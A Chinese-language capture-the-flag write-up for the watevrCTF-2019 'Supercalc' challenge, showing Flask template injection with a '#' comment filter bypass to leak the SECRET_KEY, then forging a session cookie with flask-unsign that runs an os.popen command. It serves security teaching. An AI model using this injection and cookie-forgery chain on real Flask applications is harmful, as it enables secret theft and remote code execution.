# \[watevrCTF-2019]Supercalc

## \[watevrCTF-2019]Supercalc

## 考点

* Flask SSTI获取config
* Flask SSTI使用注释绕过，`#`绕过

## wp

输入`9*9`发现会回显

![](<../../.gitbook/assets/image (1) (1).png>)

返回包会设置新的cookie

![](<../../.gitbook/assets/image (24).png>)

解密cookie

```
flask-unsign.exe --decode --cookie .eJyrVsrILC7JL6pUsoquVkrOT0lVslKyVNBSsFSq1SEoEFsLAHINEiw.Ympom w.4lGVLm2AEMchuz70376S52EDT6M
{'history': [{'code': '9 * 9'}, {'code': '9 * 9'}, {'code': '9 * 9'}]}
```

直接输入`{{7*7}}`或者`{%print(1)%}`会提示字符错误

计算器的功能那就输入`1/0`主动构造错误输入

![](<../../.gitbook/assets/image (22).png>)

发现它是把输入直接当代码处理的，这里可以fuzz一下看看哪些字符串没过滤

输入`1/0#{{7*7}}`可以看到回显的结果

![](<../../.gitbook/assets/image (8) (1).png>)

输入输入`1/0#{{config}}`获取config

```
Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'cded826a1e89925035cc05f0907855f7', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}
```

题目把cookie中的code执行了，修改为Python代码

```
flask-unsign.exe --secret "cded826a1e89925035cc05f0907855f7" --sign --cookie "{'history': [{'code': '__import__(\"os\").popen(\"cat flag.txt\").read()'}]}"
```

结果`eyJoaXN0b3J5IjpbeyJjb2RlIjoiX19pbXBvcnRfXyhcIm9zXCIpLnBvcGVuKFwiY2F0IGZsYWcudHh0XCIpLnJlYWQoKSJ9XX0.YmpyRw.x1LGNmBA3XHPATpHZDhGadZOoNA`

![](<../../.gitbook/assets/image (34).png>)
